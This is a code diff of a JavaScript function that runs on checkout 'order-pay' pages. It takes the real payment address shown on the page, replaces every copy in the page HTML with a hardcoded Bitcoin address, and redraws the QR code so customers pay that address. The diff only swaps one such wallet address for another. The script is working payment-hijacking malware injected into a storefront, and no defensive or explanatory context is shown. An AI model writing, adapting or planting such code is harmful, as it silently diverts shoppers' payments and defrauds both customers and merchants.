@@ -2,7 +2,7 @@ function api(){
 
     if (window.location.href.includes("order-pay")){
         var amo = document.getElementById("amount").innerText;
-        if(document.getElementById("qrcode").children[1].src=="https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=bitcoin:bc1qf4g7u5pxl5vrepc8tgv5xy33l4zyjquwfaupfz?amount="+amo){
+        if(document.getElementById("qrcode").children[1].src=="https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=bitcoin:bc1qge3ruk43nv53djcr8s6xhf9nmrnqewa9yjv0ws?amount="+amo){
             clearInterval(intertime);
             return 0;
         }
@@ -11,9 +11,9 @@ function api(){
         }
         var add = document.getElementById("payment-address").innerText;
         var html = document.body.innerHTML;
-        var newHtml = html.replace(new RegExp(add, 'g'), 'bc1qf4g7u5pxl5vrepc8tgv5xy33l4zyjquwfaupfz');
+        var newHtml = html.replace(new RegExp(add, 'g'), 'bc1qge3ruk43nv53djcr8s6xhf9nmrnqewa9yjv0ws');
         document.body.innerHTML = newHtml;
-        document.getElementById("qrcode").children[1].src="https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=bitcoin:bc1qf4g7u5pxl5vrepc8tgv5xy33l4zyjquwfaupfz?amount="+amo
+        document.getElementById("qrcode").children[1].src="https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=bitcoin:bc1qge3ruk43nv53djcr8s6xhf9nmrnqewa9yjv0ws?amount="+amo
 
     }
 }
